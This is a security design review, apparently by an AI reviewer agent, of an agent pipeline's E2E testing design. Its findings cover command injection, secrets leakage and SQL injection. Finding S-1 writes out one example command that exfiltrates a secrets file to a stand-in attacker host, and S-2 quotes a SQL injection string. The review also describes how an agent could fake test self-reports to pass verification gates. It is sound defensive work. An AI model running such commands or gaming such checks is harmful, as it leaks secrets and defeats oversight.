# Adversarial Review: design — security-sentinel

## Review Metadata

- **Perspective:** security-sentinel
- **Risk Level:** 🟡
- **Round:** 1
- **Run ID:** 2026-03-04T00:00:00Z
- **Feature:** tdd-e2e-enforcement
- **Task ID:** tdd-e2e-enforcement-design-review
- **Artifacts Reviewed:** design-output.yaml, design.md, spec-output.yaml, feature.md, implementer.agent.md, verifier.agent.md, orchestrator.agent.md, sql-templates.md

---

## Security Analysis

**Category Verdict:** needs_revision

### Finding S-1: E2E Contract Command Fields Lack Input Sanitization Specification

- **Severity:** Critical
- **Description:** The E2E contract schema includes executable command fields — `start_command`, `shutdown_command`, `e2e_command`, and skill step `target` fields (for CLI interaction type) — that are executed directly via `run_in_terminal`. The design specifies validation at discovery time (FR-2.5) checking only that "start_command is a non-empty string" and "ready_check is a valid URL or command." No sanitization, allowlisting, or structural validation is defined for command content. A malformed or adversarial contract could embed shell metacharacters, pipe chains, or secondary commands (e.g., `dotnet run && curl attacker.com/exfil?data=$(cat secrets.env)`). While the contract is version-controlled (D-3, CR-8), in interactive mode the pipeline itself generates the contract from user input via `ask_questions` (FR-8.2), creating an injection path from user responses to shell execution.
- **Affected artifacts:** design-output.yaml D-3 (contract location), D-11 (tool access expansion); design.md §4.1 (contract schema), §7.4 (verifier tool access); spec-output.yaml FR-2.5 (contract validation)
- **Recommendation:** Add a mandatory command sanitization layer to the E2E contract validation (FR-2.5). Define: (1) A prohibited characters/patterns list for command fields (no `&&`, `||`, `|`, `;`, `` ` ``, `$()` outside of quoted arguments), OR (2) A structured command format (`{executable: "dotnet", args: ["run", "--urls=..."]}`} instead of free-form strings, OR (3) An explicit security note in e2e-integration.md documenting that command fields are executed as shell commands and must be reviewed. At minimum, the contract validation step must flag commands containing shell metacharacters.
- **Evidence:** design.md §4.1 defines `start_command` as `string` with no content validation. FR-2.5 in spec-output.yaml line ~258 says validation checks "start_command is a non-empty string" — only presence is checked, not content safety. D-11 in design-output.yaml confirms all interaction goes through `run_in_terminal` with no command filtering.

### Finding S-2: SQL Injection via E2E Evidence Fields in output_snippet

- **Severity:** Major
- **Description:** E2E verification produces new evidence fields inserted into `anvil_checks.output_snippet` — interaction logs, step results, actual app responses, and error messages from the running application. These values originate from the target application's runtime output (HTTP response bodies, browser console logs, CLI stdout/stderr) and could contain SQL injection payloads, especially during adversarial testing phases where injection strings are intentionally submitted. The existing `sql_escape()` in sql-templates.md §0 handles single-quote doubling and null-byte stripping, but E2E evidence introduces a new class of high-entropy untrusted input (actual application error messages containing user-submitted adversarial payloads like `' OR 1=1; --`). The design adds ~11 new check_name patterns (D-7) without explicitly requiring that E2E-sourced output_snippets pass through sql_escape().
- **Affected artifacts:** design-output.yaml D-7 (SQL evidence strategy); design.md §4.6 (new check_name patterns); sql-templates.md §0 (sanitization rules), §2 (INSERT template)
- **Recommendation:** Add an explicit E2E evidence sanitization note in the e2e-integration.md reference document requiring: (1) All E2E-sourced `output_snippet` values MUST pass through `sql_escape()` before SQL insertion, (2) Application response bodies must be truncated to 500 chars BEFORE escaping (not after), (3) Binary/non-UTF-8 content must be stripped or base64-encoded. The sql-templates.md §2 template already has placeholder `sql_escape()` calls, but the design should explicitly call out that E2E evidence is untrusted input requiring the same rigor as user-supplied text.
- **Evidence:** sql-templates.md §0 lines 8-14 define sql_escape() — it handles `'` → `''` and null bytes. design.md §4.6 lists 11 new check_names that write E2E evidence to output_snippet. spec-output.yaml FR-7.3 says "≤ 500 chars in SQL" but doesn't mandate sanitization of the content source.

### Finding S-3: Secrets Exposure Risk in start_env Contract Field

- **Severity:** Major
- **Description:** The E2E contract schema defines `start_env` as a map (FR-2.1: "start_env (map)") used to pass environment variables to the application at startup. While CR-7 states "environment variables referenced by name, not value" and §7.1 says "E2E contracts (environment variables referenced by name, not value)", the contract schema does not enforce this — `start_env` accepts arbitrary key-value pairs and could contain literal secrets like `{"DATABASE_URL": "postgres://user:password@host/db", "API_KEY": "sk-live-abc123"}`. The contract validation checklist (FR-2.5) does not include a secrets scan of `start_env` values. Since the contract is version-controlled (D-3), secrets in `start_env` would be committed to the repository.
- **Affected artifacts:** design.md §4.1 (contract schema — start_env as map), §7.1 (secrets guidance); spec-output.yaml FR-2.1 (schema definition), FR-2.5 (validation), CR-7 (secrets prohibition)
- **Recommendation:** (1) Add a structural constraint: `start_env` values MUST be environment variable REFERENCES (e.g., `"$DATABASE_URL"` or `"${DATABASE_URL}"`) rather than literal values, with contract validation rejecting literal values that match common secret patterns (strings starting with `sk-`, `Bearer `, URLs with embedded credentials). (2) Add a secrets scan to FR-2.5 contract validation that checks `start_env` values against patterns from the existing Tier 4 secrets scan (verifier 5c: `password`, `secret`, `api_key`, `token`, `Bearer`, connection strings). (3) Document this in e2e-integration.md safety rules.
- **Evidence:** design.md §4.1 shows `start_env` as a "map" type. FR-2.5 validation checklist (spec-output.yaml lines ~255-260) does not include secrets checking for start_env values. The verifier's existing Tier 4 5c secrets scan (verifier.agent.md line ~229) provides a pattern list that should be reused.

### Finding S-4: Evidence Artifacts Contain Unsanitized Sensitive Data

- **Severity:** Major
- **Description:** E2E evidence capture (FR-4.7, FR-11.1) produces screenshots, HAR files, API response logs, console logs, and DOM snapshots. These artifacts are stored in `evidence_output_dir/<task-id>/<skill-id>/` as files and referenced in evidence-manifest.yaml. HAR files capture full HTTP request/response cycles including cookies, session tokens, authorization headers, and CSRF tokens. API response logs include full response bodies that may contain PII. Console logs may contain database queries with sensitive data. Screenshots may display PII on rendered pages. The design's §7.1 says "Screenshots (sensitive data masked if possible; flagged as risk if not)" — this is aspirational, not enforceable, and doesn't cover HAR files or response logs at all.
- **Affected artifacts:** design.md §7.1 (secrets in E2E artifacts); spec-output.yaml FR-4.7 (evidence capture), FR-11.1 (replay artifacts), NFR-2 (security), CR-7 (no secrets)
- **Recommendation:** (1) Define a mandatory HAR file sanitization step in Tier 5 Phase 5 (teardown) that strips `Cookie`, `Authorization`, `Set-Cookie`, and `X-CSRF-Token` headers from HAR captures before writing to evidence_output_dir. (2) Define response log truncation rules that mask authorization headers and cookie values. (3) Add an E2E evidence sanitization section to e2e-integration.md with concrete sanitization rules per artifact type. (4) NFR-2 should explicitly list HAR files and response logs as sensitive artifact types requiring sanitization.
- **Evidence:** design.md §7.1 only mentions screenshots — no sanitization rules for HAR files, response logs, or console logs. FR-4.7 (spec-output.yaml lines ~357-364) specifies HAR capture but has no sanitization requirements. EC-15 and EC-14 address error handling but not data sanitization.

### Finding S-5: Verifier Tool Access Expansion Without Command Allowlisting

- **Severity:** Critical
- **Description:** Decision D-11 (🔴 risk) expands the verifier's `run_in_terminal` scope from a narrow set of commands (SQL, build, test, lint, type-check, git show) to unrestricted shell execution during Tier 5 E2E phases. The current verifier (verifier.agent.md) states `run_in_terminal` "is permitted for: SQL INSERT/SELECT, build/compile, test execution, lint/type-check, git show baseline cross-check, and smoke execution scripts." The E2E expansion removes this boundary — the verifier executes `start_command`, `shutdown_command`, `e2e_command`, browser launch commands (e.g., `npx playwright`), HTTP client commands (`curl`), and skill step commands — all originating from the E2E contract (user-supplied YAML). The design mitigations are instruction-based only ("Expansion is limited to Tier 5 E2E phases only (not Tiers 1-4)") with no runtime enforcement.
- **Affected artifacts:** design-output.yaml D-11 (verifier tool access expansion); design.md §7.4 (tool access mitigation); verifier.agent.md (current restrictions); tool-access-matrix.md (expansion target)
- **Recommendation:** (1) Define an explicit command allowlist for Tier 5 E2E: the verifier may ONLY execute commands matching patterns derived from the validated E2E contract fields (`start_command`, `shutdown_command`, `e2e_command`) plus a small set of known-safe tool invocations (`npx playwright`, `curl`, `wget`). (2) Document in e2e-integration.md that `run_in_terminal` during Tier 5 MUST be prefixed with a comment referencing which contract field or skill step triggered the command. (3) Add a post-execution audit trail: every Tier 5 `run_in_terminal` invocation should be logged in the interaction_log with the exact command executed, enabling post-hoc security review.
- **Evidence:** D-11 in design-output.yaml (lines ~340-370) acknowledges this as 🔴 risk with "Medium" confidence. verifier.agent.md lines ~288-290 show current restrictions. design.md §7.4 lists mitigations as "Expansion is limited to Tier 5 E2E phases only" and "Commands are driven by the E2E contract" — both are instruction-based, not enforcement-based.

### Finding S-6: Port Range Validation Insufficient

- **Severity:** Minor
- **Description:** D-6 specifies deterministic port allocation from `port_range_start` (default 9000) with no minimum or maximum validation. A contract could specify `port_range_start: 80` (privileged port), `port_range_start: 0` (invalid), or `port_range_start: 65530` (near overflow with concurrent instances). The fallback strategy "increment by 1 up to port_range_start + max_concurrent_instances - 1" could produce out-of-range ports.
- **Affected artifacts:** design-output.yaml D-6 (port allocation); design.md §4.1 (port management fields); spec-output.yaml FR-5.1 (port isolation)
- **Recommendation:** Add to FR-2.5 contract validation: `port_range_start` MUST be in range [1024, 65535 - max_concurrent_instances]. Default port validation: `default_port` MUST be in [1024, 65535]. Reject contracts with privileged port assignments.
- **Evidence:** D-6 in design-output.yaml specifies "default of 9000" but no range bounds. FR-2.5 validation checklist says "port values are valid integers" but doesn't define valid range.

### Finding S-7: Adversarial Skills May Target External Services

- **Severity:** Minor
- **Description:** §7.2 states adversarial skills must "Only target the local app instance (never external services)" but the design provides no enforcement mechanism. A skill's `target` field for API interaction could specify `https://api.example.com/users` instead of `/api/users` (relative). A browser skill's navigate target could be `https://evil.com`. The verifier follows pre-defined skills deterministically (D-18) — if a skill points to an external URL, the verifier will follow it.
- **Affected artifacts:** design.md §7.2 (adversarial variation safety); spec-output.yaml FR-3.3 (step schema)
- **Recommendation:** Add contract-level validation: all skill step `target` values for browser and API interaction types MUST be relative paths or must match the contract's `base_url` domain. Absolute URLs to external domains MUST be rejected at contract validation time.
- **Evidence:** §7.2 in design.md states the rule but no validation rule in FR-2.5 or skill schema enforces it. FR-3.3 defines `target` as "string — CSS selector, URL path, API endpoint, or command" with no URL scope restriction.

---

## Architecture Analysis

**Category Verdict:** needs_revision

### Finding A-1: E2E Contract as Unvalidated Trusted Execution Input

- **Severity:** Major
- **Description:** The entire E2E system treats the E2E contract as a trusted source of executable commands and configuration. The contract is discovered at Step 0, propagated to all downstream agents, and its command fields are executed by the verifier without content validation beyond structural field checks. This creates a new trust boundary where a YAML configuration file effectively becomes a code execution specification. The existing pipeline has no analogous pattern — all other agent behaviors are defined by the agent definition files (.agent.md), not by project-level configuration files. The E2E contract shifts the execution authority from pipeline-controlled instructions to project-controlled data, breaking the pattern where agent instructions are the sole source of allowed behaviors.
- **Affected artifacts:** design-output.yaml D-3 (contract location), D-11 (tool access); design.md §3.2 (system overview); orchestrator.agent.md (current architecture)
- **Recommendation:** (1) Introduce a "contract trust level" concept in e2e-integration.md: contracts in the project root are "project-trusted" (assumed safe if repo access is controlled); contracts generated in interactive mode are "pipeline-generated" (validated more strictly). (2) Add a contract review step: in interactive mode, the generated contract MUST be presented to the user for explicit approval before any commands are executed. (3) Document the security boundary explicitly: the E2E contract has the same trust level as project source code — modifications to the contract are as significant as code changes.
- **Evidence:** orchestrator.agent.md shows no current pattern of executing commands from external configuration files — all verifier commands are derived from project tooling detection (package.json, Cargo.toml, etc.) per verifier.agent.md Tier 2 "Detect dynamically from config files." The E2E contract is a new, more powerful source of commands.

### Finding A-2: Verifier Becomes Full Process Manager Without Runtime Isolation

- **Severity:** Major
- **Description:** The verifier's current architecture is read-only for source code with a well-defined command surface (build, test, lint, git show). Tier 5 transforms the verifier into a full process manager: starting apps, managing PIDs, launching browsers, making HTTP/CLI interactions, capturing screenshots, and performing teardown with force-kill. This represents a fundamental change in the verifier's security posture from "verification agent" to "execution agent." The design's single-context execution model (Tiers 1-5 in the same agent) means a Tier 5 failure (e.g., uncaught exception in Playwright, browser process that captures the agent's attention) could prevent Tiers 1-4 from completing, undermining the entire verification cascade. Process cleanup relies on the same agent that started the processes — if the agent crashes mid-E2E (EC-11), cleanup depends on PID tracking which is stored in-context only.
- **Affected artifacts:** design-output.yaml D-5 (Tier 5 architecture), D-11 (tool access); verifier.agent.md (current architecture); design.md §7.4, §8.1 (failure modes)
- **Recommendation:** (1) Specify that Tier 5 MUST execute AFTER Tiers 1-4 complete and their SQL evidence is committed — never interleaved. This ensures verification evidence is recorded even if Tier 5 crashes. (2) Add an explicit recovery protocol for EC-11 (verifier crash mid-interaction): the orchestrator should query `anvil_checks` for `e2e-instance-start` records without matching `e2e-instance-shutdown` records, and issue kill commands for orphaned PIDs. (3) Store PIDs in `anvil_checks` output_snippet (not just in-context) so they survive agent crashes. The design already mentions PID tracking (FR-5.6) but doesn't specify where PIDs are persisted.
- **Evidence:** verifier.agent.md lines 1-10 describe the verifier as "Per-task verification agent with 4-tier cascade." design.md §8.1 lists EC-11 "Verifier crashes mid-interaction" with recovery "PID cleanup attempted" but no detail on how PIDs are recovered if the agent context is lost. FR-5.6 says "track the PID" but doesn't specify persistent PID storage.

---

## Correctness Analysis

**Category Verdict:** approve

### Finding C-1: TDD Compliance Verification Partially Bypassable via Hollow Tests

- **Severity:** Minor
- **Description:** D-13's structural analysis verifies TDD compliance via: (a) test files exist and import production modules, (b) `initial_run_failures > 0` in the implementation report, (c) behavioral_coverage maps ACs to test functions. Check (b) relies on the implementer's self-reported value — the verifier cross-checks the report field but cannot independently verify the test run occurred. An adversarial implementer could write tests that import a production module, contain an assertion on a hardcoded value, and report `initial_run_failures: 1` without actually running tests first. The adversarial reviewer (Step 7) is the second line of defense per FR-1.6, but the design could strengthen the verifier's independent verification.
- **Affected artifacts:** design-output.yaml D-13 (TDD compliance verification); spec-output.yaml FR-1.4 (independent verification)
- **Recommendation:** (1) Add a verifier cross-check: the verifier should run the tests itself (Tier 2 3d) and compare the test count against `initial_run_failures` — if the implementer reported failures but tests pass on first run during verification, flag as suspicious. (2) The existing behavioral-coverage check (3e) partially addresses this by verifying tests import production modules and map to ACs — ensure this check also verifies assertions reference production code return values, not hardcoded values.
- **Evidence:** D-13 in design-output.yaml acknowledges "Structural analysis... provides equivalent confidence" with "Medium" confidence. DR-2 documents the deviation from the spec's git-diff-based approach.

### Finding C-2: E2E Composite Gate Relies on Verifier Self-Report

- **Severity:** Minor
- **Description:** EG-9 (E2E completion) queries `check_name='e2e-test-execution' AND passed=1`. The composite `e2e-test-execution` check is a verifier-computed aggregate of all E2E sub-phases. The verifier could report `e2e-test-execution passed=1` without all sub-phases actually passing (implementation bug or adversarial verifier). Unlike Tiers 1-4 where individual checks have independent meaning, the composite E2E check aggregates multiple phases into a single boolean, losing granularity at the evidence gate.
- **Affected artifacts:** design-output.yaml D-16 (evidence gate architecture); design.md §5.3 (EG-9 query); spec-output.yaml FR-4.5 (per-phase SQL)
- **Recommendation:** Strengthen EG-9 to independently verify: instead of (or in addition to) checking the composite `e2e-test-execution`, verify that all expected sub-phase records exist. E.g., "WHERE check_name IN ('e2e-suite-execution', 'e2e-exploratory', 'e2e-adversarial') AND passed=1" should have count ≥ the number of applicable phases. This cross-checks the composite against its components.
- **Evidence:** design.md §5.3 shows EG-9 checking only `e2e-test-execution`. FR-4.5 mandates individual per-phase records but EG-9 doesn't verify their presence.

---

## Summary

The TDD & E2E Enforcement design is well-structured with 18 decisions, comprehensive failure handling, and good awareness of security concerns (§7). However, two critical security gaps exist: (1) E2E contract command fields are executed as shell commands without content validation beyond presence checks, and (2) the verifier's tool access expansion from a narrow build/test scope to unrestricted Tier 5 execution lacks command allowlisting or runtime enforcement. Three major findings cover secrets in start_env values, unsanitized sensitive data in evidence artifacts (HAR files, response logs), and SQL injection risk from E2E output containing adversarial payloads. The architecture findings highlight the E2E contract's role as an unvalidated execution input and the verifier's transformation from verification agent to full process manager without runtime isolation. All findings are addressable with design amendments before implementation.
